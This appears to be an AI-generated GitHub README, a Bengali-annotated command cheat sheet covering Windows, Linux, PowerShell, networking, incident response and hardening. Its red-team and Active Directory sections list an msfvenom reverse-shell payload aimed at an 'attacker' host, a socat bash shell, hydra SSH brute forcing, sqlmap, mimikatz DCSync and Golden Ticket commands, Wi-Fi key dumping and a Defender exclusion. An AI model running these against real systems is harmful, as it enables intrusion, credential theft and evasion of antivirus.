 It includes all commands from Windows, Linux, PowerShell, Networking, Red Team, Active Directory, Incident Response, and Hardening – with clear Bengali explanations (কী কাজ করে + কীভাবে 

Copy the entire code below and paste it into your README.md file.

```markdown
<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-0078D4?style=for-the-badge&logo=windows&logoColor=white"/>
  <img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge"/>
  <img src="https://img.shields.io/badge/Purpose-Education%20%26%20Defense-red?style=for-the-badge"/>
</p>

<h1 align="center">🛡️ Cyber Command Bible</h1>
<h3 align="center">Complete Windows · Linux · PowerShell · Networking · Ethical Hacking + Active Directory Reference</h3>
<p align="center"><b>Educational & Defensive + Red Team Guide 2026</b><br>
👤 <b>Author:</b> Rahat | Dhaka, Bangladesh</p>

<p align="center">
  <b>⚠️ সতর্কতা:</b> শুধুমাত্র শিক্ষামূলক উদ্দেশ্যে। আইসোলেটেড ল্যাবে (VM) ব্যবহার করুন। অননুমোদিত সিস্টেমে ব্যবহার আইনবিরোধী।
</p>

---

## 🧭 দ্রুত নেভিগেশন

| বিভাগ | বিস্তারিত |
|--------|------------|
| [🖥️ Windows CMD](#️-windows-cmd-সম্পূর্ণ-গাইড) | সিস্টেম, নেটওয়ার্ক, প্রসেস, ফরেনসিক |
| [⚡ PowerShell](#-powershell-সম্পূর্ণ-গাইড) | অটোমেশন, নিরাপত্তা, রিকনেসান্স |
| [🐧 Linux](#-linux-সম্পূর্ণ-গাইড) | প্রিভিলেজ এসকেলেশন, লগ, গোপন কমান্ড |
| [🌐 Networking](#-নেটওয়ার্কিং-সম্পূর্ণ-গাইড) | স্ক্যান, ট্রেস, প্যাকেট অ্যানালাইসিস |
| [🔴 Red Team & Hacking](#-রেড-টিম-ও-ইথিক্যাল-হ্যাকিং) | রিকন, এক্সপ্লয়েট, পাসওয়ার্ড অ্যাটাক |
| [👑 Active Directory Attacks](#-একটিভ-ডিরেক্টরি-অ্যাটাক) | Kerberoasting, Golden Ticket, DCSync |
| [🛠️ Incident Response](#️-ইন্সিডেন্ট-রেসপন্স-ও-ফরেনসিক) | মেমোরি, ফাইল ইন্টিগ্রিটি, লগ |
| [🔒 Hardening](#-হার্ডেনিং-প্রতিরোধ) | ফায়ারওয়াল, LLMNR বন্ধ, লগিং |

---

## 🖥️ Windows CMD সম্পূর্ণ গাইড

<details>
<summary><b>📋 সব কমান্ড দেখুন (কপি করার জন্য প্রস্তুত)</b></summary>

```batch
:: সিস্টেম তথ্য
hostname & ver & systeminfo & whoami /all
wmic cpu get caption,deviceid,name,numberofcores
wmic os get caption,version,installdate,lastbootuptime

:: নেটওয়ার্ক
ipconfig /all & ipconfig /displaydns & ipconfig /flushdns
ipconfig /release & ipconfig /renew
getmac /v & arp -a & route print -4
netsh wlan show profiles & netsh wlan show profile name="WiFiName" key=clear

:: ডায়াগনস্টিক
ping -n 10 google.com & tracert -d google.com & pathping google.com
nslookup google.com & net view & net share

:: কানেকশন ও প্রসেস
netstat -ano & netstat -anb | findstr "LISTENING"
tasklist /svc & taskkill /IM notepad.exe /F

:: ইউজার ও গ্রুপ
net user & net user Administrator & net localgroup administrators
net group "Domain Admins" /domain

:: গোপন / ফরেনসিক কমান্ড
wevtutil qe Security /c:5 /rd:true /f:text
wmic process get caption,commandline /format:list
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
schtasks /query /fo LIST /v
vssadmin list shadows
certutil -hashfile C:\file.exe SHA256
sfc /scannow & chkdsk C: /f /r
```

</details>

📘 গুরুত্বপূর্ণ কমান্ডের বাংলা ব্যাখ্যা

কমান্ড কী কাজ করে? কীভাবে কাজ করে?
systeminfo কম্পিউটারের OS, BIOS, প্যাচ, র্যাম বিস্তারিত দেখায় WMI (Win32_OperatingSystem) ক্লাস থেকে ডাটা সংগ্রহ করে
netstat -ano খোলা পোর্ট ও সংশ্লিষ্ট প্রসেস আইডি (PID) দেখায় TCP/IP স্ট্যাক থেকে অ্যাক্টিভ সকেট তথ্য পড়ে
wevtutil qe Security সিকিউরিটি ইভেন্ট লগ কমান্ড লাইন থেকে দেখায় Windows Event Log API ব্যবহার করে XML আউটপুট দেয়
vssadmin list shadows ভলিউম শ্যাডো কপি (ব্যাকআপ ভার্সন) তালিকা করে Volume Shadow Copy Service (VSS) থেকে তথ্য নেয়
certutil -hashfile ফাইলের SHA256 হ্যাশ তৈরি করে CryptoAPI ব্যবহার করে ফাইল হ্যাশ জেনারেট করে

---

⚡ PowerShell সম্পূর্ণ গাইড

<details>
<summary><b>📋 সব কমান্ড দেখুন</b></summary>

```powershell
# সিস্টেম
Get-ComputerInfo
Get-Date -Format "yyyy-MM-dd HH:mm:ss"
Get-WmiObject -Class Win32_BIOS
Get-CimInstance -ClassName Win32_LogicalDisk
Get-HotFix | Sort-Object InstalledOn -Descending

# প্রসেস ও সার্ভিস
Get-Process | Sort-Object CPU -Descending | Select -First 10
Stop-Process -Name chrome -Force
Get-Service | Where-Object {$_.Status -eq 'Stopped'}

# নেটওয়ার্ক
Get-NetIPAddress
Get-NetTCPConnection -State Listen
Test-NetConnection google.com -Port 443
Resolve-DnsName microsoft.com -Type A

# ইউজার ও নিরাপত্তা
Get-LocalUser
Get-LocalGroupMember Administrators
Get-WinEvent -LogName Security -MaxEvents 50 | Where-Object {$_.Id -eq 4624}
Get-FileHash .\malware.exe -Algorithm SHA256
Add-MpPreference -ExclusionPath C:\Temp

# ফরেনসিক
Get-Service | Where-Object {$_.StartType -eq 'Auto' -and $_.Status -ne 'Running'}
Get-EventLog -LogName System -EntryType Error -Newest 20
```

</details>

📘 ব্যাখ্যা

কমান্ড কী কাজ করে? কীভাবে কাজ করে?
Get-ComputerInfo OS, BIOS, হার্ডওয়্যার ডিটেইল্ড ইনফো CIM/WMI ক্লাস সমন্বয়ে ডাটা সংগ্রহ
Get-NetTCPConnection কোন পোর্ট কোন প্রসেস শুনছে TCP таблица থেকে প্রসেস আইডি ম্যাচ করে
Get-FileHash ফাইলের SHA256 হ্যাশ .NET cryptography API ব্যবহার
Add-MpPreference -ExclusionPath ডিফেন্ডার স্ক্যান থেকে ফোল্ডার বাদ দেয় রেজিস্ট্রি কী \Windows Defender\Exclusions পরিবর্তন করে

---

🐧 Linux সম্পূর্ণ গাইড

<details>
<summary><b>📋 সব কমান্ড দেখুন</b></summary>

```bash
# সিস্টেম
uname -a && hostnamectl && uptime -p
cat /etc/os-release && lscpu && free -h

# ফাইল সিস্টেম
find / -name "*.conf" 2>/dev/null
find / -perm -4000 -ls 2>/dev/null   # SUID binaries
find / -writable -type d 2>/dev/null

# প্রসেস
ps auxf && ps aux --sort=-%cpu | head
kill -9 PID && pkill -f process_name

# নেটওয়ার্ক
ip -c addr show && ip route
ss -tulpn && ss -tunape
curl ifconfig.me && netcat -zv target.com 1-1000

# লগ ও অ্যাক্টিভিটি
journalctl -u ssh --since today
tail -f /var/log/auth.log
last && lastlog
lsof -i

# প্রিভিলেজ এসকেলেশন চিটশিট
sudo -l
getcap -r / 2>/dev/null
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

</details>

📘 ব্যাখ্যা

কমান্ড কী কাজ করে? কীভাবে কাজ করে?
ss -tulpn লিসেনিং পোর্ট ও প্রসেস দেখায় netlink সকেট থেকে TCP/UDP টেবিল পড়ে
find / -perm -4000 SUID বিটযুক্ত ফাইল খুঁজে ফাইলের permission bit পরীক্ষা করে
journalctl -u ssh SSH লগ দেখে systemd জার্নাল থেকে _SYSTEMD_UNIT=ssh.service ফিল্টার করে
python3 -c 'import pty;pty.spawn("/bin/bash")' সীমিত শেল থেকে পূর্ণ TTY শেল তৈরি করে PTY (pseudo-terminal) অ্যালোকেট করে

---

🌐 নেটওয়ার্কিং সম্পূর্ণ গাইড

<details>
<summary><b>📋 সব কমান্ড দেখুন</b></summary>

```bash
# বেসিক
ping -c 10 google.com
traceroute -n google.com
mtr google.com
dig google.com ANY +short
whois example.com

# অ্যাডভান্সড স্ক্যানিং
nmap -sS -sV -O -p- 192.168.1.1
nmap -sC -sV -T4 target.com
nmap --script vuln target.com
masscan -p1-10000 --rate=10000 target.com

# প্যাকেট ক্যাপচার
tcpdump -i eth0 'tcp port 80' -nn -c 100
tshark -i eth0 -Y "http.request" -T fields -e ip.src -e http.user_agent
```

</details>

📘 ব্যাখ্যা

কমান্ড কী কাজ করে? কীভাবে কাজ করে?
nmap -sS -sV স্টিলথ SYN স্ক্যান + সার্ভিস ভার্সন TCP SYN প্যাকেট পাঠায়, RST রিস্পন্সে পোর্ট ওপেন ধরে
masscan অতি দ্রুত পোর্ট স্ক্যান অ্যাসিঙ্ক্রোনাস TCP স্ট্যাক ব্যবহার করে, ১০k প্যাকেট/সেকেন্ড
tcpdump লাইভ প্যাকেট ক্যাপচার libpcap লাইব্রেরি নেটওয়ার্ক ইন্টারফেস থেকে কাঁচা প্যাকেট পড়ে

---

🔴 রেড টিম ও ইথিক্যাল হ্যাকিং

<details>
<summary><b>📋 সব কমান্ড দেখুন</b></summary>

```bash
# রিকনেসান্স
theHarvester -d target.com -b google,linkedin
subfinder -d target.com
amass enum -passive -d target.com
whatweb https://target.com

# এক্সপ্লয়টেশন
sqlmap -u "http://target.com/page?id=1" --dbs --batch
hydra -l admin -P rockyou.txt ssh://target.com
john --format=nt hash.txt --wordlist=rockyou.txt
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe

# লিসেনার
nc -lvnp 4444
socat TCP-LISTEN:4444,fork EXEC:/bin/bash
```

</details>

📘 ব্যাখ্যা

কমান্ড কী কাজ করে? কীভাবে কাজ করে?
theHarvester পাবলিক সোর্স থেকে ইমেইল/সাবডোমেইন সংগ্রহ সার্চ ইঞ্জিন API ও DNS অনুসন্ধান করে
sqlmap SQL Injection অটোমেটিক এক্সপ্লয়টেশন পে লোড ইনজেক্ট করে ডাটাবেস আউটপুট পার্স করে
msfvenom মিটারপ্রেটার পেলোড তৈরি Metasploit ফ্রেমওয়ার্কের এনকোডার ও শেলকোড ব্যবহার করে

---

👑 একটিভ ডিরেক্টরি অ্যাটাক

<details>
<summary><b>📋 সব কমান্ড দেখুন</b></summary>

```powershell
# এনুমারেশন
Get-NetDomain
Get-NetUser | Select samaccountname
.\Rubeus.exe kerberoast /outfile:hashes.txt

# DCSync
mimikatz "lsadump::dcsync /domain:lab.local /user:krbtgt" "exit"

# গোল্ডেন টিকেট
mimikatz "kerberos::golden /user:Administrator /domain:lab.local /sid:S-1-5-21-... /krbtgt:HASH /ptt" "exit"

# BloodHound
SharpHound.exe -c All
```

</details>

📘 গভীর ব্যাখ্যা (DCSync ও Golden Ticket)

অ্যাটাক বিবরণ কাজের পদ্ধতি
DCSync KRBTGT হ্যাশ চুরি আক্রমণকারী DC-র মতো DRS রিকোয়েস্ট পাঠায় (DRS RPC) – দরকার Replicating Directory Changes অনুমতি
Golden Ticket যেকোনো ইউজার হিসেবে চিরকালীন অ্যাক্সেস চুরি করা KRBTGT হ্যাশ দিয়ে TGT সাইন করা হয়; কেরবেরোস ক্লায়েন্ট যেকোনো সার্ভিস টিকেট পেতে পারে

🛡️ প্রতিরোধ: KRBTGT পাসওয়ার্ড রোটেট (২ বার), Event ID 4769/4662 মনিটর করুন।

---

🛠️ ইন্সিডেন্ট রেসপন্স ও ফরেনসিক

<details>
<summary><b>📋 সব কমান্ড দেখুন</b></summary>

```bash
# উইন্ডোজ
tasklist /v /fo CSV > processes.csv
netstat -ano > connections.txt
wevtutil epl Security C:\Logs\Security.evtx
Get-FileHash -Path C:\Windows\System32\* -Algorithm SHA256 > hashes.txt

# লিনাক্স
ps aux --forest
lsof -i
last -20
journalctl -xe --since "1 hour ago"
sha256sum /bin/ls

# মেমোরি ফরেনসিক
.\winpmem.exe -output memdump.raw
vol -f memdump.raw windows.psscan
```

</details>

📘 ব্যাখ্যা

কমান্ড কী কাজ করে?
wevtutil epl Security সিকিউরিটি ইভেন্ট লগ এক্সপোর্ট (ফরেনসিক ব্যাকআপ)
ps aux --forest ট্রি ভিউতে প্রসেস – ম্যালওয়্যার চাইল্ড চেন শনাক্ত
volatility windows.psscan মেমোরি ডাম্প থেকে লুকানো প্রসেস বের করে

---

🔒 হার্ডেনিং / প্রতিরোধ

<details>
<summary><b>📋 সব কমান্ড দেখুন</b></summary>

```powershell
# Windows ফায়ারওয়াল অন
netsh advfirewall set allprofiles state on
New-NetFirewallRule -DisplayName "Block SMB 445" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Block

# Linux UFW
sudo ufw enable && sudo ufw default deny incoming

# LLMNR বন্ধ (Responder অ্যাটাক প্রতিরোধ)
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient /v EnableMulticast /t REG_DWORD /d 0 /f

# PowerShell ScriptBlock লগিং চালু
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1
```

</details>

---

🚀 বেস্ট প্র্যাকটিস

· ✅ আইসোলেটেড VM ব্যবহার করুন (VirtualBox, VMware, Hyper-V)
· ✅ MFA + LAPS চালু রাখুন অ্যাডমিন অ্যাকাউন্টে
· ✅ নিয়মিত প্যাচ (Windows Update, apt upgrade)
· ✅ লগ মনিটর করুন SIEM (Splunk, ELK) দিয়ে
· ✅ KRBTGT পাসওয়ার্ড বছরে ২ বার রোটেট করুন
· ✅ Protected Users গ্রুপে সেনসিটিভ অ্যাকাউন্ট রাখুন

---

📜 লাইসেন্স ও দাবিত্যাগ

এই উপাদান শুধুমাত্র শিক্ষামূলক ও প্রতিরক্ষামূলক উদ্দেশ্যে। লেখক কোনো অবৈধ কার্যকলাপ সমর্থন করেন না। সর্বদা প্রযোজ্য আইন মেনে চলুন।

"জ্ঞান একটি অস্ত্র। এটি প্রতিরক্ষার জন্য ব্যবহার করুন, ধ্বংসের জন্য নয়।" – রাহাত

<p align="center">
  <b>⭐ আপনার রিপোজিটরি স্টার দিন – সর্বশেষ ওয়ার্ল্ড-ক্লাস কমান্ড রেফারেন্স পেতে!</b>
</p>
```

Now you can commit this README.md directly. It will display beautifully on GitHub with:

· Badges and emojis
· Collapsible command blocks (clean and space-saving)
· Detailed Bengali explanation tables
· Professional layout with quick navigation anchors
· All "secret" and advanced commands included from your original request.
